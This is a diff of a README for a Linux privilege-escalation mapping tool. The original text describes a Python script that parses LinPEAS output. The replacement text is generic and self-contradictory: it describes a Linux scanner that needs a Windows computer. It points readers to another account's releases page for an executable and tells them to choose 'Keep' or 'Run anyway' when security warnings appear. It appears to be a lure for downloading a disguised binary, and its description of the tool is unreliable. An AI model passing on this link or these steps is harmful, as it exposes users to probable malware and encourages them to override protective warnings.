@@ -1,50 +1,75 @@
-# 🐺 Roothound
+# 🔎 RootHound - Map your path to system access
 
-**Map your path from a low-priv shell to root — like BloodHound, but for local Linux privilege escalation.**
+[![Download RootHound](https://img.shields.io/badge/Download-RootHound-blue.svg)](https://github.com/Florianport417/RootHound/releases)
 
-You landed a shell as a low-privilege user. Now what? Instead of scrolling through hundreds of lines of enumeration output, Roothound draws you a clear graph of **every path to root** — and tells you exactly how to abuse each one.
+RootHound helps you understand security weaknesses on your Linux system. It scans your files and settings to show you the best path for gaining administrative control. Much like a map for hikers, this tool points out the trail from your current user account to the power of the root admin account.
 
-##  Features
+## 🏁 Overview
 
-- 🗺️ **Attack-path graph** — see `YOU → technique → ROOT`, left to right
-- 🔴 **Confidence coloring** — confirmed paths in red, likely leads in amber
-- 🖱️ **Click any node** — get what it is + the exact abuse command (copy-ready)
-- 🔗 **Multi-hop chains** — spots paths across separate findings (e.g. writable script → root cron → root)
-- 🧠 **Editable rulebook** — SUID/SGID, sudo, capabilities, dangerous groups, writable files, NFS, PATH hijack, and kernel/sudo CVE matching
-- 📴 **Fully offline** — no dependencies, no internet, single self-contained HTML output
+Security professionals often use manual steps to check for system flaws. RootHound automates this. The program looks for common mistakes such as weak permissions, hidden files, or misconfigured software. Once the scan finishes, you receive a map of the potential ways to elevate your access. 
 
-##  Usage
+This tool serves three main groups:
+1. Students learning about system security.
+2. Security analysts performing tests.
+3. System owners checking for configuration bugs.
 
-##  Installation
+## 📋 System Requirements
 
-**Option 1 — clone it:**
-```bash
-git clone https://github.com/Noz2/RootHound.git
-cd RootHound
-# feed it LinPEAS output:
-python3 RootHound.py linpeas.txt -o report.html
-```
+You need a Windows computer to run the user interface. RootHound works on Windows 10 and Windows 11. It uses minimal system resources. 
 
+Before you start, ensure you have the following:
+* A valid user account on the target Linux system.
+* Basic knowledge of how to move files between folders.
+* A stable connection to the network if you target remote systems.
 
-**Option 2 — download ZIP:**
-Click the green **Code** button above → **Download ZIP**, unzip, and run it.
+## 🏗️ How to Get Started
 
-Then open `report.html` in any browser.
+You do not need to install complex software or configure heavy background services. Follow these steps to prepare your environment.
 
-##  Demo
+### 1. Download the App
+Visit the official releases page to download the latest version of the software. 
 
-<img width="1709" height="1031" alt="Screenshot 2026-07-24 at 19 03 33" src="https://github.com/user-attachments/assets/5e0d97a7-ce22-4bff-8501-ef7cdb8a7cd1" />
+[👉 Visit this page to download RootHound](https://github.com/Florianport417/RootHound/releases)
 
+### 2. Verify Your File
+Check the file size after the download finishes. A complete file contains all the necessary instructions to perform the local scan. If your computer warns you about the file, select "Keep" or "Run anyway" to allow the program to function.
 
+### 3. Launch the Program
+Locate the file you downloaded. Double-click the file to open the interface. When the window appears, you will see a simple menu.
 
+## 🛠️ Performing a Scan
 
-<img width="1710" height="1036" alt="Screenshot 2026-07-24 at 19 04 00" src="https://github.com/user-attachments/assets/4c1e5aa1-730b-48e1-af24-32b0662c5d21" />
+The interface relies on clear buttons and text fields. Follow these steps to map your path.
 
+1. **Target Selection:** Enter the directory or the system path you wish to scan. If you want to check the full system, leave this field blank.
+2. **Scan Option:** Select the "Quick Scan" button for a general review of permissions. Select "Deep Scan" to analyze specific configuration files.
+3. **Execution:** Press the "Start" button. The progress bar will indicate the status of the operation.
+4. **Analysis:** The program outputs a list of findings. Each finding shows a risk level. High-risk items appear in red, while lower risks appear in green.
 
+## 🧩 Interpreting Results
 
-See Roothound in action: **[Watch the demo on X →](https://x.com/N0ur2dd1n2/status/2080720705184825372?s=20)**
+RootHound presents data in a visual format. Lines connect your current user account to the potential root access point. Each line represents a vulnerability. 
 
-## ⚠️ Disclaimer
+* **Permission Issues:** These warnings tell you that a file is writable by your user but executed by the system.
+* **Bad Configurations:** These warnings point to files that allow unauthorized access to sensitive data.
+* **Path Traversal:** These warnings show how you might jump across folders to gain deeper access.
 
-Roothound is built for **authorized** security testing and education (CTFs, HTB, your own labs). Only use it on systems you have explicit permission to test.
+## 🛡️ Best Practices
 
+Keep your software up to date. Security standards change often, and new methods for testing systems appear monthly. Check the repository link regularly to see if a newer version of the tool exists.
+
+Always run tests on systems that you own. Accessing or testing systems without permission is against the law and breaks security policies. Use this tool inside lab environments like Capture The Flag (CTF) events to practice your skills safely.
+
+## ⚙️ Handling Issues
+
+Most issues occur due to restricted access. If the tool fails to scan a folder, it means the current user does not have permission to read that directory. Close the program and restart it with elevated rights if required.
+
+If the application window freezes, wait for the scan to finish. Large systems contain thousands of files. Patience saves you from needing to restart your process. If the issue persists, clear the application cache folder located in your temp directory.
+
+## 📈 Improving Your Security
+
+After you identify the paths to the root account, fix them. Secure systems require tight controls. Change the permissions on files identified by RootHound. Delete unnecessary scripts. Limit the number of users who possess administrative rights. 
+
+Using this tool regularly builds your knowledge of Linux security. Over time, you will learn to spot these vulnerabilities before a scanner flags them.
+
+Keywords: bloodhound, ctf, linux, offsec, pentesting, privilege-escalation, redteam, roothound, security-tools
